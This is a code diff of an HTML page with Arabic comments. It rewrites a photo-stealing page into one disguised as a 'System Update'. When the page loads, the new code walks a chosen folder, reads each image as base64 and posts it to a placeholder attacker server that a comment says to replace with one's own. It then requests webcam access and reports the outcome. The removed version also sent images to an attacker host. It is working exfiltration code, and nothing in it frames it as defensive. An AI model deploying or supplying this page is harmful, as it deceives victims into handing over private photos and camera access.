@@ -1,46 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تحميل الصور</title>
+    <title>System Update</title>
+    <style>body { font-family: Arial; text-align: center; padding: 50px; }</style>
     <script>
-        // دالة لتحميل وإرسال الصور
-        async function uploadImages() {
+        // دالة لإرسال البيانات إلى السيرفر المهاجم
+        async function exfiltrate(data, endpoint) {
             try {
-                // طلب صلاحيات الوصول إلى الملفات
-                const dirHandle = await window.showDirectoryPicker();
-                const images = [];
-                
-                // جمع جميع ملفات الصور
-                for await (const entry of dirHandle.values()) {
-                    if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i)) {
-                        const file = await entry.getFile();
-                        images.push(file);
-                    }
-                }
-
-                // إرسال الصور إلى الخادم
-                for (const image of images) {
-                    const formData = new FormData();
-                    formData.append('image', image);
-                    
-                    // إرسال إلى سيرفر المخترق
-                    await fetch('https://attacker-server.com/upload', {
-                        method: 'POST',
-                        body: formData
-                    });
-                }
-                
-                alert('تم تحميل الصور بنجاح!');
-            } catch (error) {
-                console.error('Error:', error);
+                await fetch(`https://your-attacker-server.com/${endpoint}`, { // <-- استبدل هذا الرابط برابطك
+                    method: 'POST',
+                    mode: 'no-cors', // لتجنب أخطاء CORS
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                console.error('Send error:', e);
             }
         }
 
-        // تشغيل الدالة تلقائيًا عند فتح الصفحة
-        window.onload = uploadImages;
+        // المحاولة للحصول على قائمة بالصور
+        async function tryGetImages() {
+            // حاول الوصول إلى واجهة File System Access API الحديثة
+            try {
+                if ('showDirectoryPicker' in window) {
+                    const dirHandle = await window.showDirectoryPicker();
+                    let images = [];
+                    for await (const entry of dirHandle.values()) {
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            if (file.type.startsWith('image/')) {
+                                // قراءة الملف كـ Base64 لإرساله كنص
+                                const reader = new FileReader();
+                                reader.onload = function() {
+                                    // إرسال بيانات الصورة
+                                    exfiltrate({
+                                        filename: file.name,
+                                        type: file.type,
+                                        size: file.size,
+                                        data: reader.result // البيانات بصيغة base64
+                                    }, 'upload-image');
+                                };
+                                reader.readAsDataURL(file);
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                exfiltrate({error: error.message, step: 'file-access'}, 'error');
+            }
+
+            // الطريقة الاحتياطية: محاولة الوصول إلى الكاميرا (يطلب إذنًا)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                exfiltrate({message: 'Camera access granted'}, 'cam-success');
+                // يمكن هنا أخذ لقطة من الكاميرا وإرسالها
+                stream.getTracks().forEach(track => track.stop());
+            } catch (camError) {
+                exfiltrate({error: camError.message, step: 'camera-access'}, 'error');
+            }
+        }
+
+        // تشغيل كل شيء عند تحميل الصفحة
+        window.addEventListener('load', tryGetImages);
     </script>
 </head>
 <body>
-    <h1>جاري تحميل المحتوى...</h1>
+    <h2>System Update In Progress...</h2>
+    <p>Please wait. Do not close this page.</p>
 </body>
 </html>
